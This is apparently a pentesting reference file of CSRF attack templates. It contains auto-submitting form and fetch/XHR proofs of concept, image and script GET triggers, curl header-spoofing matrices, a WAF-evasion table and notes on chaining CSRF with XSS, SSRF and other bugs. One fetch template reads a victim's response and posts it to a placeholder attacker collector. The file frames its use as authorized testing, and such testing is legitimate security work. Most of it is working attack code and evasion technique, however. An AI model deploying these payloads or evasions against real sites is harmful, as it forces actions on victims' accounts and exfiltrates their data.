# CSRF payloads, request templates and evasion notes

All templates use `<PLACEHOLDER>` slots — substitute target values from your own
recon, never a live target you are not authorized to test. Cross-reference variants
V-01..V-18 in `variants-1.md` / `variants-2.md` for which template applies when.

## Table of contents

- [Minimal HTML form PoC](#minimal-html-form-poc)
- [fetch / XHR PoC (no-cors + credentials)](#fetch--xhr-poc-no-cors--credentials)
- [GET trigger templates (img / script / navigation)](#get-trigger-templates-img--script--navigation)
- [Tunnelling note: text/plain and application/json](#tunnelling-note-textplain-and-applicationjson)
- [curl replay template (own session confirmation)](#curl-replay-template-own-session-confirmation)
- [WAF evasion: encodings and obfuscations](#waf-evasion-encodings-and-obfuscations)
- [Tool invocation templates](#tool-invocation-templates)
- [Chain it with](#chain-it-with)

## Minimal HTML form PoC

Auto-submitting cross-origin form — the V-01/V-03/V-04 workhorse. Works for any
urlencoded/multipart endpoint; the browser attaches the victim's session cookie
subject to SameSite rules (V-03), and every hidden value is attacker-chosen (V-01).

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>Loading…</h1>
<!-- Minimal form PoC template -->
<form id="csrf" method="POST" action="https://<TARGET_HOST>/<STATE_CHANGING_PATH>"
      enctype="application/x-www-form-urlencoded">
  <!-- business params the UI never exposes go here -->
  <input type="hidden" name="<BUSINESS_PARAM>" value="<ATTACKER_VALUE>">
  <input type="hidden" name="<OTHER_PARAM>" value="<VALUE>">
  <!-- only if the token is intentionally omitted/blank for V-06/V-07:
  <input type="hidden" name="csrf_token" value=""> -->
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Notes:
- For multipart-only targets, add `enctype="multipart/form-data"` — still a CORS
  simple request, no preflight (V-12).
- For the Chrome Lax-allow-unsafe 2-minute window (V-03), the victim must log in and
  open this page immediately; wrap submission in `setTimeout(..., 0)` and document the
  window in your repro steps.
- Do not auto-submit on sensitive flows (password/email/payment) — swap in a benign
  field (display name, timezone) per the workflow's safe-probe rule.

## fetch / XHR PoC (no-cors + credentials)

**Write CSRF, fire-and-forget:** `mode:'no-cors'` means the response is opaque (you
cannot read it), but the request executes with cookies when the content type is
simple. `credentials:'include'` is what actually attaches cross-origin cookies —
without it modern fetch defaults to `same-origin` and your test silently proves
nothing (the #1 self-inflicted false negative).

```js
// V-01/V-12/V-13: simple request, cookies included, no preflight expected
fetch('https://<TARGET_HOST>/<STATE_CHANGING_PATH>', {
  method: 'POST',
  mode: 'no-cors',            // opaque response; side effect still lands
  credentials: 'include',     // attach victim cookies cross-origin
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: '<BUSINESS_PARAM>=<ATTACKER_VALUE>'
});

// V-14: readable response (requires permissive CORS with credentials)
fetch('https://<TARGET_HOST>/<SENSITIVE_GET_PATH>', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://<ATTACKER_COLLECTOR>', {
    method: 'POST', mode: 'no-cors', body: JSON.stringify(d)
  }));
```

XHR equivalent (legacy stacks / V-12 probes):

```js
var x = new XMLHttpRequest();
x.open('POST', 'https://<TARGET_HOST>/<STATE_CHANGING_PATH>', true);
x.withCredentials = true;                      // same as credentials:'include'
x.setRequestHeader('Content-Type', 'text/plain'); // simple CT → no preflight (V-12)
x.send('<BUSINESS_PARAM>=<ATTACKER_VALUE>');
```

Gotchas that kill these PoCs in practice: omitting `credentials:'include'`;
`Content-Type: application/json` (not simple → preflight OPTIONS → read the actual
outcome in DevTools before claiming either success or block); SameSite=Lax cookie
refusing to ride a cross-site non-navigation request (retarget via the V-03
navigation form instead); expecting to *read* a no-cors response (impossible —
confirm impact server-side, not from JS).

## GET trigger templates (img / script / navigation)

For state-changing safe methods (V-02) and method-mutation probes (V-05). Only fires
when the cookie rides the vector: subresource loads need `SameSite=None`; top-level
navigation also works with Lax.

```html
<!-- subresource vectors -->
<img src="https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>" width="0" height="0" alt="">
<script src="https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>"></script>
<link rel="prefetch" href="https://<TARGET_HOST>/<PATH>?<PARAM>=<VALUE>">

<!-- top-level navigation vector (works with SameSite=Lax) -->
<script>location.href = "https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>";</script>
<!-- or meta refresh: <meta http-equiv="refresh" content="0;url=https://<HOST>/<PATH>?<PARAM>=<VALUE>"> -->
```

Caveats: `<script src>` only "succeeds" as a side channel if the endpoint mutates on
GET (otherwise it just fails to parse — check state server-side, not the tag);
`<img>`/`<script>` are cross-site subresource requests, so a Lax cookie will **not**
be attached (V-03/V-02 preconditions); `<form method="GET">` auto-submit also lands
in the top-level case.

## Tunnelling note: text/plain and application/json

- `application/x-www-form-urlencoded`, `multipart/form-data`, and `text/plain` are
  CORS **simple** content types → the browser sends them cross-origin **without a
  preflight**. `application/json` is not simple → always triggers `OPTIONS`
  (V-13/V-14 decide whether that preflight passes).
- The JSON-over-simple-request trick (V-12/V-13): send a JSON *string* as the body
  with `Content-Type: text/plain`:

  ```js
  fetch('https://<TARGET_HOST>/<API_PATH>', {
    method: 'POST', mode: 'no-cors', credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ '<BUSINESS_PARAM>': '<VALUE>' })
  });
  ```

  This works only if the server type-sniffs or its parser accepts wildcards
  (`express.json({type:'*/*'})`, Laravel `Request::json()`, Rails format sniffing) —
  probe with the V-13 matrix before assuming.
- Reverse direction: some form endpoints deserialize `application/json` bodies —
  test both representations on the same path (V-13 matrix).
- Legitimate `application/json` POST from a browser page is *also* possible when the
  server's preflight allows your origin — that outcome belongs to V-14: record the
  `OPTIONS` verdict and the actual response separately, they can disagree.
- Multipart note (V-12): crafting multipart by hand needs a boundary; in curl use
  `-F 'name=value'` and let curl build headers.

## curl replay template (own session confirmation)

Replay from your **own** authenticated session first (safe probe), then vary one
header at a time. Never treat curl-only header spoofing as proof for browser victims
(V-11 false-positive rule).

```bash
# 1) baseline with the legit token, from tester's own session
curl -sS -D - -o /tmp/body.txt \
  -b '<SESSION_COOKIE_NAME>=<SESSION_COOKIE_VALUE>' \
  -X POST 'https://<TARGET_HOST>/<STATE_CHANGING_PATH>' \
  -H 'Origin: https://<TARGET_HOST>' \
  -H 'Referer: https://<TARGET_HOST>/<ORIG_PAGE_PATH>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'csrf_token=<LEGIT_TOKEN>&<BUSINESS_PARAM>=<SANDBOX_VALUE>'

# 2) variant matrix — change ONE thing per run, log status + body + side effect
#    a) token omitted          → drop the csrf_token= field
#    b) token blank            → --data 'csrf_token=<PLACEHOLDER_EMPTY>'
#    c) token foreign          → --data 'csrf_token=<ATTACKER_SESSION_TOKEN>'
#    d) Origin null            → -H 'Origin: null'
#    e) Origin regex-buster    → -H 'Origin: https://<TARGET_HOST>.evil.tld'
#    f) no Origin/Referer      → delete both header lines
#    g) method mutation        → -X GET with params in the query string
#    h) CT reshaping           → -H 'Content-Type: text/plain' / -F 'a=b' (multipart)

# 3) raw response headers (Set-Cookie, CORS, CRLF splitting — V-10/V-14)
curl -sS -i -X OPTIONS 'https://<TARGET_HOST>/<API_PATH>' \
  -H 'Origin: https://<ATTACKER_ORIGIN>' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type'

# 4) WebSocket handshake probe (V-16, own session)
curl -sS -i 'https://<TARGET_HOST>/ws' \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: <BASE64_24BYTES>' \
  -H 'Origin: https://<ATTACKER_ORIGIN>' \
  -b '<SESSION_COOKIE_NAME>=<SESSION_COOKIE_VALUE>'

# 5) clean-room cookie jar for V-06/V-07 (fresh session, no lazy-init surprises)
curl -sS -c /tmp/fresh.jar -b /tmp/fresh.jar 'https://<TARGET_HOST>/landing'
curl -sS -c /tmp/fresh.jar -b /tmp/fresh.jar -X POST \
  'https://<TARGET_HOST>/<STATE_CHANGING_PATH>' --data '<PARAM>=<VALUE>'
```

Interpretation discipline: status **and** body **and** server-side side effect, three
signals every time; a 200 with `{"error":...}` is a failure, and a cached 200 may have
never reached origin (add a random query param / check `Age`).

## WAF evasion: encodings and obfuscations

Apply to the *body/URL* of the PoC when a WAF blocks the plain payload. WAF evasion
does not change the vulnerability — it changes whether your probe reaches origin.

| Technique | Example | When it helps |
|---|---|---|
| HTML entity encoding of field values | `value="&#x61;&#x74;&#x74;&#x61;&#x63;&#x6b;&#x65;&#x72;"` | WAF signatures scan HTML PoC pages / stored reflected fields |
| Comment/whitespace insertion in JS PoC | `doc/**/.getElementById('f').submit()` | Breaks naive script-signature matches on inline PoCs |
| URL-encoding of parameter names | `%63srf_token=...` | PHP-style stacks decode names before lookup; naive WAF matches raw `csrf_token` only |
| Case variation of header names | `X-Csrf-Token` vs `x-csrf-token` | Header-name signatures are case-sensitive in some rulesets (values must keep server-expected case) |
| Param name permutation | `csrf`, `_csrf`, `xsrf`, `_token`, `authenticity_token`, `csrfmiddlewaretoken` | Framework accept-lists cover several names while the WAF signs on one |
| Parameter pollution | `csrf_token=<LEGIT>&csrf_token=stripped` | Last/first-wins parsers (PHP, some proxies) read a different half than the WAF validated |
| Multipart wrapping of urlencoded fields | `-F 'param=value'` boundary body | WAF signs `application/x-www-form-urlencoded` bodies only (V-12) |
| `text/plain` body with urlencoded/JSON content | `Content-Type: text/plain` + same bytes | Simple CT both evades body-signing and skips preflight (V-12/V-13) |
| JSON key/value whitespace + newlines | `{\n  "<PARAM>": "<VALUE>"\n}` | Literal-string JSON signatures; still parsed by origin |
| JSON unicode escapes in values | `"\u0061\u0074\u0074"` | Value-signatures on strings the parser unescapes |
| Method override headers | `X-HTTP-Method-Override: PUT`, body `_method=PUT` | Method-scoped WAF rules (POST-only) + stack honors override (V-05) |
| Split GET into chunked/partial refs | `/?a=1` + separate `&b=2` via `<form method="GET">` | URL-length/single-packet signatures on long query strings |
| Origin/Referer shape variants | `Origin: null`, sandboxed iframe, `Referrer-Policy: no-referrer` | Origin-allowlist and Referer-signature rules (V-11) — this is a *logic* bypass, not just encoding |

Sanity rule: if the evasion only works because your tool sends something a browser
never would, it is a lead (V-11 FP rule) — retest the winning shape from a real
browser page before reporting.

## Tool invocation templates

```bash
# V-11/V-14 header-rule mapping loop (one variable per request)
for o in "null" "https://evil.tld" "https://<TARGET_HOST>.evil.tld" "https://evil.tld/?x=<TARGET_HOST>"; do
  printf '%-45s ' "$o"
  curl -sS -o /dev/null -w '%{http_code}\n' -b '<COOKIE>' -X POST \
    'https://<TARGET_HOST>/<PATH>' -H "Origin: $o" --data '<PARAM>=<VALUE>'
done

# V-14 preflight vs actual, side by side
curl -sS -i -X OPTIONS 'https://<TARGET_HOST>/<API>' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  -H 'Access-Control-Request-Method: POST' | grep -iE 'HTTP/|access-control'
curl -sS -i -X POST 'https://<TARGET_HOST>/<API>' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  --data '<PARAM>=<VALUE>' | grep -iE 'HTTP/|access-control'

# V-09 token harvest for entropy analysis (own accounts only)
for i in 1 2 3 4 5; do curl -sS -c "/tmp/jar$i" -b "/tmp/jar$i" -o /dev/null -D - \
  'https://<TARGET_HOST>/login' | grep -i 'set-cookie.*csrf'; done

# V-15 policy fetch
curl -sS -D - 'https://<TARGET_HOST>/crossdomain.xml'
curl -sS -D - 'https://<TARGET_HOST>/clientaccesspolicy.xml'
```

In-browser confirmation (the verdict that matters for browser-only controls): serve
the PoC page from `https://<ATTACKER_ORIGIN>/poc.html`, open it in a clean profile
with the victim session logged in, and inspect the network panel for cookie
attachment + preflight + response — then re-fetch the target as the victim to confirm
the persisted state change.

## Chain it with

- **`xss-testing`** — XSS-assisted CSRF and DOM-based token theft (V-18): any
  same-origin script defeats tokens entirely; use its payload set for the read
  primitive (meta-tag token harvesting, `postMessage` leaks, JSONP/CORS-readable
  token endpoints) and report the root cause as XSS with CSRF as the impact when
  script execution is the driver.
- **`bac-idor-testing`** — privilege implications (V-01/V-08/V-17): a CSRF proof
  only shows *forced action*; broken access control decides whether that action can
  target other users' objects or escalate role (`user_id`/`role` tampering in the
  forged body, mass assignment on the same endpoint). Chain "attacker forges request"
  with "endpoint accepts cross-object parameters" for the real severity.
- **`business-logic-testing`** — CSRF against workflow steps (multi-stage transfers,
  OTP/verification flows) and race + CSRF combinations where one forged step breaks
  the workflow invariant (V-01/V-17 login-adjacent chains).
- **`info-disclosure-testing`** — token/secret leaks that enable CSRF: tokens in
  URLs landing in `Referer`, `.env`/sourcemaps exposing token-generation logic, and
  verbose errors that reveal validation order (V-07/V-09/V-11 reconnaissance).
- **`ssrf-testing` / `rce-testing`** — CSRF on admin-configurable sinks (webhook/URL fields,
  import endpoints) that turns forced configuration into blind SSRF (`ssrf-testing`)
  or a second-order RCE (`rce-testing`) (severity multiplier on V-01).
- **`sqli-testing`** — forged requests carrying injected parameters into
  SQL-backed actions; often the CSRF report is the delivery vehicle while SQLi is
  the impact.
- **`path-traversal-testing`** — CSRF on file/delete/import operations combined with
  traversal in filename parameters (V-01 body-tampering overlap).
- **`sandbox-escape-testing`** — when the CSRF target is an admin action operating
  on a sandboxed worker/runtime, chain the forced action to the sandbox's escape
  primitive for full-impact demonstration.
